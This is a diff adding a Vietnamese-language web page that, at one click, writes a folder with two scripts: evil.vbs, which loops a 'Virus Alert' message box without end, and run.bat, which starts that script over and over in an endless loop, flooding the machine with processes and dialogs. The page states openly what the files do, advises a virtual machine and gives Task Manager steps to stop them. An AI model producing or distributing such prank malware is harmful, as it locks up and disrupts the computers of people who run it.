@@ -1,0 +1,178 @@
+﻿<!DOCTYPE html>
+<html lang="vi">
+<head>
+<meta charset="UTF-8">
+<title>Tải xuống</title>
+<style>
+  * { box-sizing: border-box; }
+  body {
+    margin: 0; height: 100vh;
+    display: flex; justify-content: center; align-items: center;
+    background: linear-gradient(135deg, #1a1a2e, #16213e);
+    font-family: 'Segoe UI', sans-serif;
+  }
+  .card {
+    text-align: center; padding: 45px 55px;
+    background: rgba(255,255,255,0.05);
+    border: 1px solid rgba(255,255,255,0.1);
+    border-radius: 20px;
+    backdrop-filter: blur(10px);
+    max-width: 540px;
+  }
+  h1 { color: #fff; margin: 0 0 12px; font-size: 26px; }
+  p.sub {
+    color: #9aa4b2; margin: 0 0 25px;
+    font-size: 14px; line-height: 1.6;
+  }
+  .tree {
+    background: rgba(0,0,0,0.3);
+    border: 1px solid rgba(255,255,255,0.08);
+    border-radius: 10px;
+    padding: 14px 20px;
+    margin: 0 auto 25px;
+    text-align: left;
+    font-family: Consolas, monospace;
+    font-size: 13px;
+    color: #c8d0da;
+    max-width: 380px;
+  }
+  .tree .folder { color: #ffd166; }
+  .tree .file { color: #7be0a1; }
+  button {
+    padding: 16px 48px; font-size: 18px; font-weight: 600;
+    color: #fff; background: #e94560;
+    border: none; border-radius: 12px; cursor: pointer;
+    transition: all 0.2s;
+  }
+  button:hover { background: #ff6b81; transform: scale(1.05); }
+  button:active { transform: scale(0.97); }
+  button:disabled { background: #555; cursor: default; transform: none; }
+  .status {
+    margin-top: 18px; font-size: 13px; min-height: 20px;
+    color: #7be0a1;
+  }
+  .status.err { color: #ff9f9f; }
+  .warn {
+    margin-top: 24px; font-size: 12px; color: #ff9f9f;
+    opacity: 0.9; line-height: 1.7; text-align: left;
+    border-top: 1px dashed rgba(255,159,159,0.3);
+    padding-top: 16px;
+  }
+  code { background: rgba(255,255,255,0.1); padding: 2px 6px; border-radius: 4px; }
+  b { color: #fff; }
+  .fallback {
+    margin-top: 15px; font-size: 12px; color: #9aa4b2;
+  }
+  .fallback a { color: #ff6b81; cursor: pointer; text-decoration: underline; }
+</style>
+</head>
+<body>
+  <div class="card">
+    <h1>😈 Tạo folder H.A</h1>
+    <p class="sub">Bấm nút → chọn nơi lưu → code tự tạo folder <b>H.A</b> và ghi 2 file vào.</p>
+
+    <div class="tree">
+      📁 <span class="folder">H.A/</span><br>
+      &nbsp;&nbsp;├─ 📄 <span class="file">evil.vbs</span> <span style="color:#666">(hộp thoại &gt;:3 vô hạn)</span><br>
+      &nbsp;&nbsp;└─ 📄 <span class="file">run.bat</span> <span style="color:#666">(loop spawn evil.vbs)</span>
+    </div>
+
+    <button id="btn">Tạo folder H.A</button>
+    <div class="status" id="status"></div>
+    <div class="fallback" id="fallback" style="display:none">
+      Trình duyệt không hỗ trợ → <a id="fallbackBtn">tải 2 file riêng lẻ</a>
+    </div>
+
+    <div class="warn">
+      ⚠️ <b>Cách tắt khi bị kẹt:</b> Task Manager (<code>Ctrl+Shift+Esc</code>)<br>
+      → End task <b>tất cả</b> <code>wscript.exe</code> và <code>cmd.exe</code>.<br>
+      <br>
+      🔥 <b>Cảnh báo:</b> <code>run.bat</code> dùng vòng lặp <code>start</code> nên mỗi giây
+      spawn thêm 1 <code>wscript.exe</code> → tạo ra <b>hàng trăm hộp thoại</b> cùng lúc.
+      Chỉ nên chạy trên <b>máy ảo / máy test</b>.
+    </div>
+  </div>
+
+  <script>
+    const statusEl = document.getElementById('status');
+    const fallbackEl = document.getElementById('fallback');
+
+    const crlf = s => s.replace(/\r?\n/g, '\r\n').replace(/^\r\n/, '');
+
+    const vbsContent = crlf(`Do
+    MsgBox ">:3", 0+48, "Virus Alert"
+Loop
+`);
+
+    const batContent = crlf(`@echo off
+
+:loop
+start evil.vbs
+
+goto loop
+`);
+
+    function setStatus(msg, isErr = false) {
+      statusEl.textContent = msg;
+      statusEl.classList.toggle('err', isErr);
+    }
+
+    // Tải 1 file đơn lẻ (fallback)
+    function downloadFile(name, content) {
+      const blob = new Blob([content], { type: 'application/octet-stream' });
+      const url = URL.createObjectURL(blob);
+      const a = document.createElement('a');
+      a.href = url;
+      a.download = name;
+      document.body.appendChild(a);
+      a.click();
+      document.body.removeChild(a);
+      setTimeout(() => URL.revokeObjectURL(url), 1000);
+    }
+
+    // Ghi file vào folder (dùng File System Access API)
+    async function writeFile(dirHandle, name, content) {
+      const fileHandle = await dirHandle.getFileHandle(name, { create: true });
+      const writable = await fileHandle.createWritable();
+      await writable.write(content);
+      await writable.close();
+    }
+
+    // Nút chính: tạo folder H.A
+    document.getElementById('btn').addEventListener('click', async () => {
+      if (typeof window.showDirectoryPicker !== 'function') {
+        setStatus('Trình duyệt không hỗ trợ File System Access API.', true);
+        fallbackEl.style.display = 'block';
+        return;
+      }
+
+      try {
+        setStatus('Đang chờ bạn chọn nơi lưu...');
+        const parentDir = await window.showDirectoryPicker({ mode: 'readwrite' });
+
+        // Tạo folder con H.A
+        const haDir = await parentDir.getDirectoryHandle('H.A', { create: true });
+
+        // Ghi 2 file
+        await writeFile(haDir, 'evil.vbs', vbsContent);
+        await writeFile(haDir, 'run.bat',  batContent);
+
+        setStatus('✅ Đã tạo folder "H.A" với 2 file: evil.vbs + run.bat');
+      } catch (err) {
+        if (err.name === 'AbortError') {
+          setStatus('Đã huỷ.');
+        } else {
+          setStatus('Lỗi: ' + err.message, true);
+        }
+      }
+    });
+
+    // Fallback: tải 2 file riêng
+    document.getElementById('fallbackBtn').addEventListener('click', () => {
+      downloadFile('evil.vbs', vbsContent);
+      setTimeout(() => downloadFile('run.bat', batContent), 400);
+      setStatus('Đã tải 2 file riêng — tự bỏ vào folder H.A nhé.');
+    });
+  </script>
+</body>
+</html>
